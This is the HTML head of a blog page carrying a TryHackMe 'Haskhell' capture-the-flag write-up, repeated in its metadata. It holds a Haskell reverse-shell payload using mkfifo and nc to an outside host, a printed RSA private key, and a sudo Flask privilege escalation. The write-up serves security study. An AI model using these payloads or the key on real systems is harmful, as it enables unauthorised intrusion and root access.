<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Tryhackme Haskhell | DC0deZer0</title>
<meta name="generator" content="Jekyll v4.2.0">
<meta property="og:title" content="Tryhackme Haskhell">
<meta name="author" content="Jeevan Chandra">
<meta property="og:locale" content="en_US">
<meta name="description" content="Let’s get started Nmap Scan. nmap -sV -sC -Pn -p- -T4 hask.thm Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 03:30 EDT Nmap scan report for hask.thm (10.10.129.213) Host is up (0.16s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA) | 256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA) |_ 256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519) 5001/tcp open http Gunicorn 19.7.1 |_http-server-header: gunicorn/19.7.1 |_http-title: Homepage Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 657.29 seconds From the Nmap scan I can see that port 5001 is the only useful port that can be enumerated. Having a look on the http site @ 5001 I come to see this page Seeing the hyperlink homework here I clicked on it and it took me to the page where an assignment can be submitted. Clicking on the submit button it says that PAGE NOT FOUND. Using Gobuster to find the directories of the machine. Gobuster root@Ac3:~# gobuster dir -u http://hask.thm:5001/ -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://hask.thm:5001/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/07/08 03:33:08 Starting gobuster =============================================================== /submit (Status: 200) =============================================================== 2020/07/08 03:36:03 Finished =============================================================== So it’s not uploads but it’s Submit. Tried a bunch of stuff like uploading a PHP shell and stuff like that, but nothing seems to be working. Remembering from previous pages this site probably accepts a haskell scripts. Reverse shell A little bit research on haskell I found that we can call a command using the below script. root@Ac3:~/Haskhell# cat shell.hs module Main where import System.Process main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.2.148 5566 &gt;/tmp/f&quot; Uploading the file and starting up a listner nc -lnvp 5566 and visiting the url hask.thm/uploads/shell.hs gave me the reverse shell. root@Ac3:~/Haskhell# nc -lnvp 5566 listening on [any] 5566 ... connect to [10.9.2.148] from (UNKNOWN) [10.10.129.213] 44224 /bin/sh: 0: can't access tty; job control turned off $ id uid=1001(flask) gid=1001(flask) groups=1001(flask) $ We can use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' for a shell upgrade. Getting User.txt flask@haskhell:/home$ ls flask haskell prof flask@haskhell:/home$ flask@haskhell:/home$ cd prof cd prof flask@haskhell:/home/prof$ ls ls __pycache__ user.txt flask@haskhell:/home/prof$ cat user.txt cat user.txt flag{--------------} From here I see a .ssh folder which contains the id_rsa of professor, So I copied that to my kali and used ssh to login as prof. flask@haskhell:/home/prof/.ssh$ cat id_rsa cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr 94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++ 6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr 7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2 o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67 54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2 kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY 3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U /cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S /+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA== -----END RSA PRIVATE KEY----- SSH to Prof root@Ac3:~/Haskhell# ssh -i id_rsa prof@hask.thm The authenticity of host 'hask.thm (10.10.129.213)' can't be established. ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'hask.thm,10.10.129.213' (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jul 8 08:06:37 UTC 2020 System load: 0.0 Processes: 108 Usage of /: 26.3% of 19.56GB Users logged in: 0 Memory usage: 48% IP address for eth0: 10.10.129.213 Swap usage: 0% 39 packages can be updated. 0 updates are security updates. Last login: Wed May 27 18:45:06 2020 from 192.168.126.128 $ id uid=1002(prof) gid=1002(prof) groups=1002(prof) We can use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' for a shell upgrade. $ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' prof@haskhell:~$ Checking the priv of prof prof@haskhell:~$ sudo -l Matching Defaults entries for prof on haskhell: env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User prof may run the following commands on haskhell: (root) NOPASSWD: /usr/bin/flask run Privilege Escalation prof@haskhell:~$ nano root.py import os os.system(&quot;/bin/sh&quot;) prof@haskhell:~$ nano root.py prof@haskhell:~$ export FLASK_APP=root.py prof@haskhell:~$ sudo flask run # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt flag{*****************} If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968">
<meta property="og:description" content="Let’s get started Nmap Scan. nmap -sV -sC -Pn -p- -T4 hask.thm Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 03:30 EDT Nmap scan report for hask.thm (10.10.129.213) Host is up (0.16s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA) | 256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA) |_ 256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519) 5001/tcp open http Gunicorn 19.7.1 |_http-server-header: gunicorn/19.7.1 |_http-title: Homepage Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 657.29 seconds From the Nmap scan I can see that port 5001 is the only useful port that can be enumerated. Having a look on the http site @ 5001 I come to see this page Seeing the hyperlink homework here I clicked on it and it took me to the page where an assignment can be submitted. Clicking on the submit button it says that PAGE NOT FOUND. Using Gobuster to find the directories of the machine. Gobuster root@Ac3:~# gobuster dir -u http://hask.thm:5001/ -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://hask.thm:5001/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/07/08 03:33:08 Starting gobuster =============================================================== /submit (Status: 200) =============================================================== 2020/07/08 03:36:03 Finished =============================================================== So it’s not uploads but it’s Submit. Tried a bunch of stuff like uploading a PHP shell and stuff like that, but nothing seems to be working. Remembering from previous pages this site probably accepts a haskell scripts. Reverse shell A little bit research on haskell I found that we can call a command using the below script. root@Ac3:~/Haskhell# cat shell.hs module Main where import System.Process main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.2.148 5566 &gt;/tmp/f&quot; Uploading the file and starting up a listner nc -lnvp 5566 and visiting the url hask.thm/uploads/shell.hs gave me the reverse shell. root@Ac3:~/Haskhell# nc -lnvp 5566 listening on [any] 5566 ... connect to [10.9.2.148] from (UNKNOWN) [10.10.129.213] 44224 /bin/sh: 0: can't access tty; job control turned off $ id uid=1001(flask) gid=1001(flask) groups=1001(flask) $ We can use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' for a shell upgrade. Getting User.txt flask@haskhell:/home$ ls flask haskell prof flask@haskhell:/home$ flask@haskhell:/home$ cd prof cd prof flask@haskhell:/home/prof$ ls ls __pycache__ user.txt flask@haskhell:/home/prof$ cat user.txt cat user.txt flag{--------------} From here I see a .ssh folder which contains the id_rsa of professor, So I copied that to my kali and used ssh to login as prof. flask@haskhell:/home/prof/.ssh$ cat id_rsa cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr 94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++ 6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr 7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2 o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67 54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2 kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY 3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U /cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S /+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA== -----END RSA PRIVATE KEY----- SSH to Prof root@Ac3:~/Haskhell# ssh -i id_rsa prof@hask.thm The authenticity of host 'hask.thm (10.10.129.213)' can't be established. ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'hask.thm,10.10.129.213' (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jul 8 08:06:37 UTC 2020 System load: 0.0 Processes: 108 Usage of /: 26.3% of 19.56GB Users logged in: 0 Memory usage: 48% IP address for eth0: 10.10.129.213 Swap usage: 0% 39 packages can be updated. 0 updates are security updates. Last login: Wed May 27 18:45:06 2020 from 192.168.126.128 $ id uid=1002(prof) gid=1002(prof) groups=1002(prof) We can use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' for a shell upgrade. $ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' prof@haskhell:~$ Checking the priv of prof prof@haskhell:~$ sudo -l Matching Defaults entries for prof on haskhell: env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User prof may run the following commands on haskhell: (root) NOPASSWD: /usr/bin/flask run Privilege Escalation prof@haskhell:~$ nano root.py import os os.system(&quot;/bin/sh&quot;) prof@haskhell:~$ nano root.py prof@haskhell:~$ export FLASK_APP=root.py prof@haskhell:~$ sudo flask run # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt flag{*****************} If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968">
<link rel="canonical" href="https://jeevanachandra.github.io//tryhackme/2020/07/08/Haskhell.html">
<meta property="og:url" content="https://jeevanachandra.github.io//tryhackme/2020/07/08/Haskhell.html">
<meta property="og:site_name" content="DC0deZer0">
<meta property="og:image" content="https://jeevanachandra.github.io//assets/img/sample/hask/hask.png">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2020-07-08T15:04:00+05:30">
<meta name="twitter:card" content="summary_large_image">
<meta property="twitter:image" content="https://jeevanachandra.github.io//assets/img/sample/hask/hask.png">
<meta property="twitter:title" content="Tryhackme Haskhell">
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"https://jeevanachandra.github.io//tryhackme/2020/07/08/Haskhell.html"},"description":"Let’s get started Nmap Scan. nmap -sV -sC -Pn -p- -T4 hask.thm Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 03:30 EDT Nmap scan report for hask.thm (10.10.129.213) Host is up (0.16s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA) | 256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA) |_ 256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519) 5001/tcp open http Gunicorn 19.7.1 |_http-server-header: gunicorn/19.7.1 |_http-title: Homepage Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 657.29 seconds From the Nmap scan I can see that port 5001 is the only useful port that can be enumerated. Having a look on the http site @ 5001 I come to see this page Seeing the hyperlink homework here I clicked on it and it took me to the page where an assignment can be submitted. Clicking on the submit button it says that PAGE NOT FOUND. Using Gobuster to find the directories of the machine. Gobuster root@Ac3:~# gobuster dir -u http://hask.thm:5001/ -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://hask.thm:5001/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/07/08 03:33:08 Starting gobuster =============================================================== /submit (Status: 200) =============================================================== 2020/07/08 03:36:03 Finished =============================================================== So it’s not uploads but it’s Submit. Tried a bunch of stuff like uploading a PHP shell and stuff like that, but nothing seems to be working. Remembering from previous pages this site probably accepts a haskell scripts. Reverse shell A little bit research on haskell I found that we can call a command using the below script. root@Ac3:~/Haskhell# cat shell.hs module Main where import System.Process main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.2.148 5566 &gt;/tmp/f&quot; Uploading the file and starting up a listner nc -lnvp 5566 and visiting the url hask.thm/uploads/shell.hs gave me the reverse shell. root@Ac3:~/Haskhell# nc -lnvp 5566 listening on [any] 5566 ... connect to [10.9.2.148] from (UNKNOWN) [10.10.129.213] 44224 /bin/sh: 0: can&#39;t access tty; job control turned off $ id uid=1001(flask) gid=1001(flask) groups=1001(flask) $ We can use python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; for a shell upgrade. Getting User.txt flask@haskhell:/home$ ls flask haskell prof flask@haskhell:/home$ flask@haskhell:/home$ cd prof cd prof flask@haskhell:/home/prof$ ls ls __pycache__ user.txt flask@haskhell:/home/prof$ cat user.txt cat user.txt flag{--------------} From here I see a .ssh folder which contains the id_rsa of professor, So I copied that to my kali and used ssh to login as prof. flask@haskhell:/home/prof/.ssh$ cat id_rsa cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr 94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++ 6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr 7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2 o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67 54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2 kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY 3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U /cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S /+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA== -----END RSA PRIVATE KEY----- SSH to Prof root@Ac3:~/Haskhell# ssh -i id_rsa prof@hask.thm The authenticity of host &#39;hask.thm (10.10.129.213)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;hask.thm,10.10.129.213&#39; (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jul 8 08:06:37 UTC 2020 System load: 0.0 Processes: 108 Usage of /: 26.3% of 19.56GB Users logged in: 0 Memory usage: 48% IP address for eth0: 10.10.129.213 Swap usage: 0% 39 packages can be updated. 0 updates are security updates. Last login: Wed May 27 18:45:06 2020 from 192.168.126.128 $ id uid=1002(prof) gid=1002(prof) groups=1002(prof) We can use python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; for a shell upgrade. $ python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; prof@haskhell:~$ Checking the priv of prof prof@haskhell:~$ sudo -l Matching Defaults entries for prof on haskhell: env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User prof may run the following commands on haskhell: (root) NOPASSWD: /usr/bin/flask run Privilege Escalation prof@haskhell:~$ nano root.py import os os.system(&quot;/bin/sh&quot;) prof@haskhell:~$ nano root.py prof@haskhell:~$ export FLASK_APP=root.py prof@haskhell:~$ sudo flask run # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt flag{*****************} If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968","@type":"BlogPosting","image":"https://jeevanachandra.github.io//assets/img/sample/hask/hask.png","headline":"Tryhackme Haskhell","dateModified":"2020-07-08T15:04:00+05:30","datePublished":"2020-07-08T15:04:00+05:30","url":"https://jeevanachandra.github.io//tryhackme/2020/07/08/Haskhell.html","author":{"@type":"Person","name":"Jeevan Chandra"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="shortcut icon" href="">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
  <link rel="stylesheet" href="/assets/css/main.css">
  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="https://jeevanachandra.github.io//feed.xml" title="DC0deZer0">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
<!-- and it's easy to individually load additional languages -->
<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>



















<script>
// Init highlight js
document.addEventListener('DOMContentLoaded', function(event) {
  var els = document.querySelectorAll('pre code')

  function addLangData(block) {
    var outer = block.parentElement.parentElement.parentElement;
    var lang = block.getAttribute('data-lang');
    for (var i = 0; i < outer.classList.length; i++) {
      var cls = outer.classList[i];
      if (cls.startsWith('language-')) {
        lang = cls;
        break;
      }
    }
    if (!lang) {
      cls = block.getAttribute('class');
      lang = cls ? cls.replace('hljs ', '') : '';
    }
    if (lang.startsWith('language-')) {
      lang = lang.substr(9);
    }
    block.setAttribute('class', 'hljs ' + lang);
    block.parentNode.setAttribute('data-lang', lang);
  }

  function addBadge(block) {
    var enabled = ('true' || 'true').toLowerCase();
    if (enabled == 'true') {
      var pre = block.parentElement;
      pre.classList.add('badge');
    }
  }

  function handle(block) {
    addLangData(block);
    addBadge(block)
    hljs.highlightBlock(block);
  }

  for (var i = 0; i < els.length; i++) {
    var el = els[i];
    handle(el);
  }
});
</script>

<style>
  /* code language badge */
  pre.badge::before {
    content: attr(data-lang);
    color: #fff;
    background-color: #ff4e00;
    padding: 0 .5em;
    border-radius: 0 2px;
    text-transform: uppercase;
    text-align: center;
    min-width: 32px;
    display: inline-block;
    position: absolute;
    right: 0;
  }

  /* fix wrong badge display for firefox browser */
  code > table pre::before {
    display: none;
  }
</style>
</head>
<body>



















<header class="site-header " role="banner">

  <div class="wrapper">
    <div class="site-header-inner">
<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
  <img class="site-favicon" title="DC0deZer0" src="" onerror="this.style.display='none'">
  DC0deZer0
</a>
</span><nav class="site-nav">
          <input type="checkbox" id="nav-trigger" class="nav-trigger">
          <label for="nav-trigger">
            <span class="menu-icon">
              <svg viewbox="0 0 18 15" width="18px" height="15px">
                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
              </svg>
            </span>
          </label>

          <div class="trigger">
